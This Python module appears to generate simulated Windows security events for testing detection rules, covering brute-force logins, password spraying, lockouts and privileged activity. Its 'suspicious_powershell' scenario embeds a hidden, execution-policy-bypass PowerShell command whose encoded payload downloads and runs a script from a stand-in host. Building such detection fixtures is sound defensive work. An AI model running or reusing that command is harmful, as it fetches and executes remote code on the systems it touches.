import random
import uuid
import json
from datetime import datetime, timedelta
from typing import List, Dict, Any
from models import Event

def generate_event_id() -> str:
    return f"EVT-{datetime.utcnow().strftime('%y%m%d%H%M%S')}-{uuid.uuid4().hex[:4].upper()}"

def create_simulated_event(
    event_id_code: int,
    category: str,
    description: str,
    severity: str,
    hostname: str,
    username: str,
    source_ip: str,
    timestamp: datetime,
    raw_details: Dict[str, Any],
    related_rule: str = None
) -> Event:
    return Event(
        id=generate_event_id(),
        timestamp=timestamp,
        source_type="Windows Security Log",
        hostname=hostname,
        source_ip=source_ip,
        username=username,
        event_category=category,
        event_id=event_id_code,
        description=description,
        severity=severity,
        raw_data=json.dumps(raw_details),
        origin="Simulated",
        related_rule_id=related_rule
    )

def generate_scenario_events(scenario: str, target_user: str = "admin", source_ip: str = "192.168.1.105", count: int = None) -> List[Event]:
    events: List[Event] = []
    now = datetime.utcnow()

    if scenario == "failed_logins":
        # Rule 1 trigger: 5 or more failed logins (Event ID 4625)
        num_events = count or 6
        target_account = target_user or "jdoe"
        src_ip = source_ip or "192.168.1.144"
        host = "WS-FINANCE-02.CORP.LOCAL"

        for i in range(num_events):
            t = now - timedelta(seconds=(num_events - i) * 15)
            raw = {
                "EventID": 4625,
                "LogonType": 3,  # Network
                "WorkstationName": "WORKSTATION-REMOTE",
                "FailureReason": "Unknown user name or bad password.",
                "SubStatus": "0xC000006A",
                "ProcessName": "C:\\Windows\\System32\\lsass.exe",
                "IpAddress": src_ip,
                "TargetUserName": target_account,
                "TargetDomainName": "CORP"
            }
            evt = create_simulated_event(
                event_id_code=4625,
                category="Authentication",
                description=f"An account failed to log on: {target_account} from {src_ip} (Bad Password)",
                severity="Medium" if i >= 4 else "Low",
                hostname=host,
                username=target_account,
                source_ip=src_ip,
                timestamp=t,
                raw_details=raw
            )
            events.append(evt)

    elif scenario == "login_after_failures":
        # Rule 2 trigger: 3-4 failures followed by 1 successful login
        target_account = target_user or "finance_analyst"
        src_ip = source_ip or "10.0.12.88"
        host = "SRV-FINANCE.CORP.LOCAL"

        # 4 failures
        for i in range(4):
            t = now - timedelta(seconds=(6 - i) * 20)
            raw = {
                "EventID": 4625,
                "LogonType": 10,  # RemoteInteractive (RDP)
                "WorkstationName": "LAPTOP-ATTACKER",
                "FailureReason": "Unknown user name or bad password.",
                "SubStatus": "0xC000006A",
                "IpAddress": src_ip,
                "TargetUserName": target_account
            }
            events.append(create_simulated_event(
                event_id_code=4625,
                category="Authentication",
                description=f"An account failed to log on: {target_account} from {src_ip}",
                severity="Low",
                hostname=host,
                username=target_account,
                source_ip=src_ip,
                timestamp=t,
                raw_details=raw
            ))

        # 1 success right after
        t_success = now - timedelta(seconds=10)
        raw_success = {
            "EventID": 4624,
            "LogonType": 10,
            "WorkstationName": "LAPTOP-ATTACKER",
            "AuthenticationPackageName": "Negotiate",
            "ProcessName": "C:\\Windows\\System32\\winlogon.exe",
            "IpAddress": src_ip,
            "TargetUserName": target_account
        }
        events.append(create_simulated_event(
            event_id_code=4624,
            category="Authentication",
            description=f"An account was successfully logged on: {target_account} via RDP from {src_ip}",
            severity="High",
            hostname=host,
            username=target_account,
            source_ip=src_ip,
            timestamp=t_success,
            raw_details=raw_success
        ))

    elif scenario == "account_lockout":
        # Rule 3 trigger: Account lockout events (Event ID 4740)
        users = [target_user or "hr_specialist", "payroll_admin", "dev_svc"]
        host = "SEC-DC01.CORP.LOCAL"
        for i, u in enumerate(users[:count or 3]):
            t = now - timedelta(seconds=(3 - i) * 30)
            raw = {
                "EventID": 4740,
                "TargetUserName": u,
                "SubjectUserName": "SYSTEM",
                "CallerComputerName": "WS-REMOTE-99",
                "AccountLockedOut": True
            }
            events.append(create_simulated_event(
                event_id_code=4740,
                category="Account Management",
                description=f"A user account was locked out due to excessive failed attempts: {u}",
                severity="Medium",
                hostname=host,
                username=u,
                source_ip=source_ip or "192.168.1.189",
                timestamp=t,
                raw_details=raw
            ))

    elif scenario == "suspicious_powershell":
        # Rule 4 trigger: Event ID 4688 with suspicious command line
        host = "WS-ENG-15.CORP.LOCAL"
        user = target_user or "developer01"
        t = now - timedelta(seconds=25)
        raw = {
            "EventID": 4688,
            "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBsAG8AYwBhAGwALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
            "ParentProcessName": "C:\\Windows\\explorer.exe",
            "SubjectUserName": user,
            "MandatoryLabel": "High Mandatory Level"
        }
        events.append(create_simulated_event(
            event_id_code=4688,
            category="Process Creation",
            description="Suspicious encoded in-memory PowerShell process spawned with bypass flags",
            severity="High",
            hostname=host,
            username=user,
            source_ip=source_ip or "10.0.8.44",
            timestamp=t,
            raw_details=raw
        ))

    elif scenario == "privileged_activity":
        # Rule 5 trigger: Event ID 4672 for Administrator
        host = "SEC-DC01.CORP.LOCAL"
        user = "Administrator"
        t = now - timedelta(seconds=15)
        raw = {
            "EventID": 4672,
            "SubjectUserName": user,
            "SubjectDomainName": "CORP",
            "PrivilegeList": ["SeSecurityPrivilege", "SeBackupPrivilege", "SeRestorePrivilege", "SeDebugPrivilege", "SeTcbPrivilege"]
        }
        events.append(create_simulated_event(
            event_id_code=4672,
            category="Privilege Escalation",
            description="Special privileges assigned to new logon: Administrator allocated SeDebugPrivilege and SeBackupPrivilege",
            severity="Low",
            hostname=host,
            username=user,
            source_ip=source_ip or "10.0.1.10",
            timestamp=t,
            raw_details=raw
        ))

    elif scenario == "multiple_accounts_one_ip":
        # Rule 6 trigger: Password spraying - multiple accounts from single IP
        src_ip = source_ip or "203.0.113.195"
        accounts = ["admin", "root", "support", "billing", "service_account", "helpdesk"]
        host = "GATEWAY-VPN01.CORP.LOCAL"

        for i, acc in enumerate(accounts[:count or 5]):
            t = now - timedelta(seconds=(6 - i) * 15)
            raw = {
                "EventID": 4625,
                "LogonType": 3,
                "IpAddress": src_ip,
                "TargetUserName": acc,
                "FailureReason": "Unknown user name or bad password.",
                "SubStatus": "0xC000006A"
            }
            events.append(create_simulated_event(
                event_id_code=4625,
                category="Authentication",
                description=f"Failed external authentication probe against account: {acc} from {src_ip}",
                severity="Medium",
                hostname=host,
                username=acc,
                source_ip=src_ip,
                timestamp=t,
                raw_details=raw
            ))

    elif scenario == "normal_activity":
        # Baseline normal traffic
        normal_samples = [
            (4624, "Authentication", "User successfully logged on locally via interactive desktop", "Low", "WS-FINANCE-01", "sarah.connor", "10.0.4.52"),
            (4688, "Process Creation", "New process created: C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "Informational", "WS-FINANCE-01", "sarah.connor", "10.0.4.52"),
            (4624, "Authentication", "Network logon successful for file share access", "Informational", "SRV-FILE01", "backup_agent", "10.0.1.200"),
            (4672, "Privilege Escalation", "Routine special privileges assigned for SYSTEM maintenance task", "Informational", "SEC-DC01", "SYSTEM", "127.0.0.1"),
            (4688, "Process Creation", "Scheduled backup process started: robocopy.exe", "Informational", "SRV-BACKUP", "svc_sched", "10.0.1.15")
        ]
        for item in normal_samples[:count or 5]:
            t = now - timedelta(minutes=random.randint(2, 45))
            raw = {"EventID": item[0], "Details": item[2], "IpAddress": item[6]}
            events.append(create_simulated_event(
                event_id_code=item[0],
                category=item[1],
                description=item[2],
                severity=item[3],
                hostname=item[4],
                username=item[5],
                source_ip=item[6],
                timestamp=t,
                raw_details=raw
            ))

    return events
